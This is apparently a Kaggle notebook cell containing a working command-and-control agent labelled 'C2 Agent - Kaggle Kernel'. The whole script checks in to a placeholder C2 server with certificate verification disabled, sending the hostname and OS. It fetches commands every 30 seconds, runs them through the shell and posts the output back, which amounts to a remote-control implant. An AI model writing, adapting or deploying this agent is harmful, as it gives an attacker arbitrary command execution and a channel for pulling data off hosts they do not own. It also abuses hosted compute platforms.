In [ ]:
# C2 Agent - Kaggle Kernel
import os, sys, json, time, socket, platform, subprocess, hashlib, threading
import urllib3
urllib3.disable_warnings()

C2_URL = "C2_SERVER_URL"
KERNEL_ID = 'KERNEL_ID'
POLL_INTERVAL = 30

def checkin():
    import requests
    info = {"kernel_id": KERNEL_ID, "info": {"hostname": socket.gethostname(), "os": platform.system()}}
    try:
        r = requests.post(f"{C2_URL}/api/kaggle/agent/checkin", json=info, timeout=10, verify=False)
        return r.json().get("commands", [])
    except:
        return []

def send_result(cmd_id, result):
    import requests
    try:
        requests.post(f"{C2_URL}/api/kaggle/agent/result", json={"kernel_id": KERNEL_ID, "cmd_id": cmd_id, "result": result}, timeout=10, verify=False)
    except:
        pass

print(f"[Agent] Starting: {KERNEL_ID}")
print(f"[Agent] C2: {C2_URL}")

while True:
    commands = checkin()
    for cmd in commands:
        try:
            result = subprocess.check_output(cmd.get("payload", ""), shell=True, stderr=subprocess.STDOUT, timeout=300).decode()
            send_result(cmd["id"], {"status": "ok", "output": result})
        except Exception as e:
            send_result(cmd["id"], {"status": "error", "error": str(e)})
    time.sleep(POLL_INTERVAL)
